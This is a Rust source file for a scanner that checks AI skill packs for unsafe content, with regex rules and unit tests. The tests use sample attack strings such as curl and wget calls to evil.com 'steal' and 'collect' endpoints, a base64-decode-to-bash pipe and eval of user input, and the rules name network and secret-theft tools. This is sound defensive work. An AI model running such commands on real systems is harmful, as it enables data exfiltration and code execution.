//! Static analysis for skill safety.
//!
//! Pattern-based scanning of skill content to detect dangerous or suspicious
//! patterns before skills are adopted. Integrated into `validate`, `install`,
//! `pack`, and `publish` flows.
//!
//! Safety scanning is a separate concern from structural validation
//! (`validate_skillpack`). Validation checks correctness; safety checks content.

use std::collections::HashMap;
use std::fmt;
use std::sync::LazyLock;

use regex::Regex;

use crate::state::{KNOWN_CAPABILITIES, SkillFile, SkillMetadata};

/// Severity of a safety finding.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Severity {
    /// Informational -- shown to the user but does not block.
    Warning,
    /// Blocks validate/pack/publish (exit code 2).
    Danger,
}

impl fmt::Display for Severity {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Severity::Warning => write!(f, "warning"),
            Severity::Danger => write!(f, "DANGER"),
        }
    }
}

/// A single finding from safety scanning.
#[derive(Debug, Clone)]
pub struct SafetyFinding {
    /// Rule identifier (e.g. "shell-injection-backtick").
    pub rule_id: String,
    /// Human-readable description.
    pub message: String,
    /// Severity level.
    pub severity: Severity,
    /// Which file the match was found in.
    pub file: String,
    /// The matched text (truncated to 60 chars).
    pub matched: String,
    /// Line number (1-based) if available.
    pub line: Option<usize>,
}

/// Aggregated safety scan results.
#[derive(Debug, Clone)]
pub struct SafetyReport {
    pub findings: Vec<SafetyFinding>,
}

impl SafetyReport {
    /// True if any finding has `Severity::Danger`.
    pub fn has_danger(&self) -> bool {
        self.findings.iter().any(|f| f.severity == Severity::Danger)
    }

    /// True if no findings at all.
    pub fn is_empty(&self) -> bool {
        self.findings.is_empty()
    }
}

/// A compiled scanning rule.
struct Rule {
    id: &'static str,
    description: &'static str,
    severity: Severity,
    pattern: Regex,
}

/// All built-in rules, compiled once.
static RULES: LazyLock<Vec<Rule>> = LazyLock::new(|| {
    vec![
        // -- Danger: shell injection --
        Rule {
            id: "shell-injection-backtick",
            description: "Backtick command substitution in skill content",
            severity: Severity::Danger,
            pattern: Regex::new(r"`[^`]*\b(curl|wget|bash|sh|python|ruby|perl|nc|ncat)\b[^`]*`")
                .unwrap(),
        },
        Rule {
            id: "shell-injection-subshell",
            description: "$(command) substitution in skill content",
            severity: Severity::Danger,
            pattern: Regex::new(r"\$\([^)]+\)").unwrap(),
        },
        Rule {
            id: "shell-eval",
            description: "eval/exec with dynamic content",
            severity: Severity::Danger,
            pattern: Regex::new(r#"\b(eval|exec)\s+["'`$]"#).unwrap(),
        },
        // -- Danger: hardcoded credentials --
        Rule {
            id: "hardcoded-api-key",
            description: "Hardcoded API key",
            severity: Severity::Danger,
            pattern: Regex::new(r#"(?i)api[_-]?key\s*[=:]\s*["'][A-Za-z0-9_\-]{16,}["']"#).unwrap(),
        },
        Rule {
            id: "hardcoded-password",
            description: "Hardcoded password",
            severity: Severity::Danger,
            pattern: Regex::new(r#"(?i)password\s*[=:]\s*["'][^"']{4,}["']"#).unwrap(),
        },
        Rule {
            id: "private-key",
            description: "Embedded private key material",
            severity: Severity::Danger,
            pattern: Regex::new(r"-----BEGIN\s+(RSA\s+)?PRIVATE KEY-----").unwrap(),
        },
        Rule {
            id: "known-token-pattern",
            description: "Known token pattern (GitHub PAT, OpenAI key, AWS key)",
            severity: Severity::Danger,
            pattern: Regex::new(r"\b(ghp_[A-Za-z0-9]{36}|sk-[A-Za-z0-9]{32,}|AKIA[A-Z0-9]{16})\b")
                .unwrap(),
        },
        // -- Warning: exfiltration --
        Rule {
            id: "exfiltration-curl",
            description: "curl/wget to external URL (potential data exfiltration)",
            severity: Severity::Warning,
            pattern: Regex::new(r"\b(curl|wget)\s+.*https?://").unwrap(),
        },
        Rule {
            id: "exfiltration-fetch",
            description: "fetch()/requests.post() to external URL",
            severity: Severity::Warning,
            pattern: Regex::new(
                r#"\b(fetch\s*\(\s*["']https?://|requests\.(post|put|patch)\s*\(\s*["']https?://)"#,
            )
            .unwrap(),
        },
        // -- Warning: safety bypasses --
        Rule {
            id: "safety-bypass-no-verify",
            description: "Disabling safety checks (--no-verify, --insecure, --force)",
            severity: Severity::Warning,
            pattern: Regex::new(r"--(no-verify|insecure|force)\b").unwrap(),
        },
        Rule {
            id: "safety-bypass-yolo",
            description: "Disabling interactive prompts or safety guards",
            severity: Severity::Warning,
            pattern: Regex::new(r"(DANGEROUSLY_DISABLE|--yes\s+--no-prompt)").unwrap(),
        },
        // -- Warning: obfuscation --
        Rule {
            id: "obfuscation-base64",
            description: "Base64 decoding (potential obfuscated payload)",
            severity: Severity::Warning,
            pattern: Regex::new(r"\b(base64\s+-d|base64\s+--decode|atob\s*\(|b64decode\s*\()")
                .unwrap(),
        },
        Rule {
            id: "obfuscation-hex",
            description: "Long hex escape sequences (potential obfuscated payload)",
            severity: Severity::Warning,
            pattern: Regex::new(r"(\\x[0-9a-fA-F]{2}){8,}").unwrap(),
        },
    ]
});

/// Scan a skillpack for safety issues.
///
/// Scans SKILL.md, skill.toml raw text, and all extra files. Also checks
/// metadata for over-broad capability requests.
///
/// Rules whose `id` appears in `suppressed` are skipped.
pub fn scan(
    skill_md: &str,
    skill_toml_raw: &str,
    files: &HashMap<String, SkillFile>,
    metadata: &SkillMetadata,
    suppressed: &[String],
) -> SafetyReport {
    let mut findings = Vec::new();

    // Scan SKILL.md
    scan_content(skill_md, "SKILL.md", suppressed, &mut findings);

    // Scan skill.toml raw text
    scan_content(skill_toml_raw, "skill.toml", suppressed, &mut findings);

    // Scan extra files
    let mut sorted_paths: Vec<&String> = files.keys().collect();
    sorted_paths.sort();
    for path in sorted_paths {
        let file = &files[path];
        scan_content(&file.content, path, suppressed, &mut findings);
    }

    // Non-regex check: over-broad capabilities
    check_capabilities(metadata, suppressed, &mut findings);

    // Sort: Danger before Warning, then by file, then by line
    findings.sort_by(|a, b| {
        b.severity
            .cmp(&a.severity)
            .then_with(|| a.file.cmp(&b.file))
            .then_with(|| a.line.cmp(&b.line))
    });

    SafetyReport { findings }
}

/// Scan a single piece of content against all rules.
fn scan_content(
    content: &str,
    file_name: &str,
    suppressed: &[String],
    findings: &mut Vec<SafetyFinding>,
) {
    for rule in RULES.iter() {
        if suppressed.iter().any(|s| s == rule.id) {
            continue;
        }

        for (line_idx, line) in content.lines().enumerate() {
            if let Some(m) = rule.pattern.find(line) {
                let matched_text = m.as_str();
                let truncated = if matched_text.len() > 60 {
                    format!("{}...", &matched_text[..57])
                } else {
                    matched_text.to_string()
                };

                findings.push(SafetyFinding {
                    rule_id: rule.id.to_string(),
                    message: rule.description.to_string(),
                    severity: rule.severity,
                    file: file_name.to_string(),
                    matched: truncated,
                    line: Some(line_idx + 1),
                });
            }
        }
    }
}

/// Check for over-broad capability requests.
///
/// If a skill requests all known capabilities, that is suspicious.
fn check_capabilities(
    metadata: &SkillMetadata,
    suppressed: &[String],
    findings: &mut Vec<SafetyFinding>,
) {
    const RULE_ID: &str = "overbroad-capabilities";

    if suppressed.iter().any(|s| s == RULE_ID) {
        return;
    }

    if let Some(ref compat) = metadata.skill.compatibility {
        let requested: Vec<&str> = compat
            .required_capabilities
            .iter()
            .map(|s| s.as_str())
            .collect();

        // Flag if the skill requests every known capability
        if !requested.is_empty() && KNOWN_CAPABILITIES.iter().all(|cap| requested.contains(cap)) {
            findings.push(SafetyFinding {
                rule_id: RULE_ID.to_string(),
                message: format!(
                    "Skill requests all {} known capabilities -- unusually broad",
                    KNOWN_CAPABILITIES.len()
                ),
                severity: Severity::Warning,
                file: "skill.toml".to_string(),
                matched: format!("required_capabilities = {:?}", requested),
                line: None,
            });
        }
    }
}

/// Truncate matched text for display (exported for use in CLI formatting).
pub fn truncate_match(s: &str, max: usize) -> String {
    if s.len() > max {
        format!("{}...", &s[..max.saturating_sub(3)])
    } else {
        s.to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::state::{Compatibility, SkillInfo};

    fn empty_metadata() -> SkillMetadata {
        SkillMetadata {
            skill: SkillInfo {
                name: "test".to_string(),
                owner: "testowner".to_string(),
                version: "1.0".to_string(),
                description: "test skill".to_string(),
                trigger: None,
                license: None,
                author: None,
                classification: None,
                compatibility: None,
            },
        }
    }

    fn scan_text(content: &str) -> SafetyReport {
        scan(content, "", &HashMap::new(), &empty_metadata(), &[])
    }

    // -- Per-rule detection tests --

    #[test]
    fn test_shell_injection_backtick() {
        let report = scan_text("Run `curl http://evil.com/steal`");
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "shell-injection-backtick"),
            "should detect backtick command substitution"
        );
    }

    #[test]
    fn test_shell_injection_subshell() {
        let report = scan_text("echo $(whoami)");
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "shell-injection-subshell"),
            "should detect $() substitution"
        );
    }

    #[test]
    fn test_shell_eval() {
        let report = scan_text("eval \"$USER_INPUT\"");
        assert!(
            report.findings.iter().any(|f| f.rule_id == "shell-eval"),
            "should detect eval with dynamic content"
        );
    }

    #[test]
    fn test_hardcoded_api_key() {
        let report = scan_text(r#"api_key = "sk_live_1234567890abcdefghij""#);
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "hardcoded-api-key"),
            "should detect hardcoded API key"
        );
    }

    #[test]
    fn test_hardcoded_password() {
        let report = scan_text(r#"password = "hunter2secret""#);
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "hardcoded-password"),
            "should detect hardcoded password"
        );
    }

    #[test]
    fn test_private_key() {
        let report = scan_text("-----BEGIN PRIVATE KEY-----");
        assert!(
            report.findings.iter().any(|f| f.rule_id == "private-key"),
            "should detect private key"
        );
    }

    #[test]
    fn test_private_key_rsa() {
        let report = scan_text("-----BEGIN RSA PRIVATE KEY-----");
        assert!(
            report.findings.iter().any(|f| f.rule_id == "private-key"),
            "should detect RSA private key"
        );
    }

    #[test]
    fn test_known_token_github_pat() {
        let report = scan_text("token: ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij");
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "known-token-pattern"),
            "should detect GitHub PAT"
        );
    }

    #[test]
    fn test_known_token_openai() {
        let report = scan_text("key: sk-abcdefghijklmnopqrstuvwxyz123456");
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "known-token-pattern"),
            "should detect OpenAI key"
        );
    }

    #[test]
    fn test_known_token_aws() {
        let report = scan_text("aws_key = AKIAIOSFODNN7EXAMPLE");
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "known-token-pattern"),
            "should detect AWS key"
        );
    }

    #[test]
    fn test_exfiltration_curl() {
        let report = scan_text("curl -X POST https://evil.com/collect");
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "exfiltration-curl"),
            "should detect curl to external URL"
        );
    }

    #[test]
    fn test_exfiltration_wget() {
        let report = scan_text("wget https://evil.com/payload");
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "exfiltration-curl"),
            "should detect wget to external URL"
        );
    }

    #[test]
    fn test_exfiltration_fetch() {
        let report = scan_text("fetch('https://evil.com/api')");
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "exfiltration-fetch"),
            "should detect fetch() to external URL"
        );
    }

    #[test]
    fn test_exfiltration_requests_post() {
        let report = scan_text("requests.post('https://evil.com/collect')");
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "exfiltration-fetch"),
            "should detect requests.post() to external URL"
        );
    }

    #[test]
    fn test_safety_bypass_no_verify() {
        let report = scan_text("git commit --no-verify");
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "safety-bypass-no-verify"),
            "should detect --no-verify"
        );
    }

    #[test]
    fn test_safety_bypass_insecure() {
        let report = scan_text("curl --insecure https://example.com");
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "safety-bypass-no-verify"),
            "should detect --insecure"
        );
    }

    #[test]
    fn test_safety_bypass_force() {
        let report = scan_text("git push --force origin main");
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "safety-bypass-no-verify"),
            "should detect --force"
        );
    }

    #[test]
    fn test_safety_bypass_yolo() {
        let report = scan_text("DANGEROUSLY_DISABLE_SANDBOX=1");
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "safety-bypass-yolo"),
            "should detect DANGEROUSLY_DISABLE"
        );
    }

    #[test]
    fn test_obfuscation_base64_cli() {
        let report = scan_text("echo payload | base64 -d | bash");
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "obfuscation-base64"),
            "should detect base64 -d"
        );
    }

    #[test]
    fn test_obfuscation_base64_js() {
        let report = scan_text("let decoded = atob(encodedData)");
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "obfuscation-base64"),
            "should detect atob()"
        );
    }

    #[test]
    fn test_obfuscation_base64_python() {
        let report = scan_text("import base64; data = b64decode(payload)");
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "obfuscation-base64"),
            "should detect b64decode()"
        );
    }

    #[test]
    fn test_obfuscation_hex() {
        let report = scan_text(r"payload = \x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21");
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "obfuscation-hex"),
            "should detect long hex escape sequences"
        );
    }

    // -- Clean skill test --

    #[test]
    fn test_clean_skill_no_findings() {
        let skill_md = r#"# Rust Development

Use cargo fmt before committing. Run clippy with -D warnings.

## Conventions

- Use snake_case for functions
- Add doc comments to public APIs
"#;
        let report = scan_text(skill_md);
        assert!(
            report.is_empty(),
            "clean skill should produce no findings, got: {:?}",
            report.findings
        );
    }

    // -- Suppression test --

    #[test]
    fn test_suppression() {
        let content = "curl -X POST https://evil.com/collect";
        let report = scan(
            content,
            "",
            &HashMap::new(),
            &empty_metadata(),
            &["exfiltration-curl".to_string()],
        );
        assert!(
            !report
                .findings
                .iter()
                .any(|f| f.rule_id == "exfiltration-curl"),
            "suppressed rule should not produce findings"
        );
    }

    #[test]
    fn test_suppression_partial() {
        let content = "curl --insecure https://evil.com/collect";
        let report = scan(
            content,
            "",
            &HashMap::new(),
            &empty_metadata(),
            &["exfiltration-curl".to_string()],
        );
        // exfiltration-curl suppressed, but safety-bypass-no-verify should still fire
        assert!(
            !report
                .findings
                .iter()
                .any(|f| f.rule_id == "exfiltration-curl"),
            "suppressed rule should not fire"
        );
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "safety-bypass-no-verify"),
            "non-suppressed rule should still fire"
        );
    }

    // -- Severity ordering --

    #[test]
    fn test_danger_sorts_before_warning() {
        let content = "curl --insecure https://evil.com/collect\neval \"$PAYLOAD\"";
        let report = scan_text(content);
        assert!(report.findings.len() >= 2);
        // First finding should be Danger
        let first_danger = report
            .findings
            .iter()
            .position(|f| f.severity == Severity::Danger);
        let first_warning = report
            .findings
            .iter()
            .position(|f| f.severity == Severity::Warning);
        if let (Some(d), Some(w)) = (first_danger, first_warning) {
            assert!(d < w, "Danger findings should sort before Warning findings");
        }
    }

    // -- Over-broad capabilities --

    #[test]
    fn test_overbroad_capabilities() {
        let mut metadata = empty_metadata();
        metadata.skill.compatibility = Some(Compatibility {
            requires_tool_use: None,
            requires_vision: None,
            min_context_tokens: None,
            required_capabilities: KNOWN_CAPABILITIES.iter().map(|s| s.to_string()).collect(),
            required_mcp_servers: vec![],
            verified_with: vec![],
        });

        let report = scan("", "", &HashMap::new(), &metadata, &[]);
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "overbroad-capabilities"),
            "should detect request for all known capabilities"
        );
    }

    #[test]
    fn test_subset_capabilities_ok() {
        let mut metadata = empty_metadata();
        metadata.skill.compatibility = Some(Compatibility {
            requires_tool_use: None,
            requires_vision: None,
            min_context_tokens: None,
            required_capabilities: vec!["shell_exec".to_string(), "file_read".to_string()],
            required_mcp_servers: vec![],
            verified_with: vec![],
        });

        let report = scan("", "", &HashMap::new(), &metadata, &[]);
        assert!(
            !report
                .findings
                .iter()
                .any(|f| f.rule_id == "overbroad-capabilities"),
            "subset of capabilities should not trigger"
        );
    }

    // -- has_danger / is_empty helpers --

    #[test]
    fn test_has_danger() {
        let report = scan_text("eval \"$PAYLOAD\"");
        assert!(report.has_danger());
    }

    #[test]
    fn test_no_danger_warnings_only() {
        let report = scan_text("git push --force origin main");
        assert!(!report.has_danger(), "warnings should not count as danger");
        assert!(!report.is_empty());
    }

    #[test]
    fn test_empty_report() {
        let report = scan_text("# A normal skill\nDo regular things.");
        assert!(report.is_empty());
        assert!(!report.has_danger());
    }

    // -- Extra files scanning --

    #[test]
    fn test_scans_extra_files() {
        let mut files = HashMap::new();
        files.insert(
            "scripts/deploy.sh".to_string(),
            SkillFile {
                content: "eval \"$REMOTE_CMD\"".to_string(),
                mime_type: "text/x-shellscript".to_string(),
            },
        );

        let report = scan("# Clean skill", "", &files, &empty_metadata(), &[]);
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.file == "scripts/deploy.sh" && f.rule_id == "shell-eval"),
            "should scan extra files"
        );
    }

    // -- Line number tracking --

    #[test]
    fn test_line_numbers() {
        let content = "line one\nline two\neval \"$PAYLOAD\"\nline four";
        let report = scan_text(content);
        let finding = report
            .findings
            .iter()
            .find(|f| f.rule_id == "shell-eval")
            .unwrap();
        assert_eq!(finding.line, Some(3), "should report correct line number");
    }

    // -- Truncation --

    #[test]
    fn test_matched_text_truncation() {
        let long_key = format!(r#"api_key = "{}""#, "A".repeat(100));
        let report = scan_text(&long_key);
        let finding = report
            .findings
            .iter()
            .find(|f| f.rule_id == "hardcoded-api-key")
            .unwrap();
        assert!(
            finding.matched.len() <= 63,
            "matched text should be truncated"
        );
        assert!(finding.matched.ends_with("..."));
    }

    // -- Real test-registry skills should be clean --

    #[test]
    fn test_real_skills_clean() {
        let test_registry = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("test-registry");
        if !test_registry.exists() {
            return;
        }

        // Scan known-good skills (not unsafe-demo)
        let good_skills = [
            "joshrotenberg/rust-dev",
            "joshrotenberg/code-review",
            "acme/git-conventions",
            "acme/python-dev",
        ];

        for skill_path in &good_skills {
            let dir = test_registry.join(skill_path);
            if !dir.exists() {
                continue;
            }
            let skill_md_path = dir.join("SKILL.md");
            let skill_toml_path = dir.join("skill.toml");
            if !skill_md_path.exists() || !skill_toml_path.exists() {
                continue;
            }

            let skill_md = std::fs::read_to_string(&skill_md_path).unwrap();
            let skill_toml_raw = std::fs::read_to_string(&skill_toml_path).unwrap();
            let metadata: SkillMetadata = toml::from_str(&skill_toml_raw).unwrap();

            let report = scan(&skill_md, &skill_toml_raw, &HashMap::new(), &metadata, &[]);
            // Allow warnings (some skills may mention --force in docs) but no Danger
            assert!(
                !report.has_danger(),
                "Skill {} should not have danger findings, got: {:?}",
                skill_path,
                report
                    .findings
                    .iter()
                    .filter(|f| f.severity == Severity::Danger)
                    .collect::<Vec<_>>()
            );
        }
    }
}
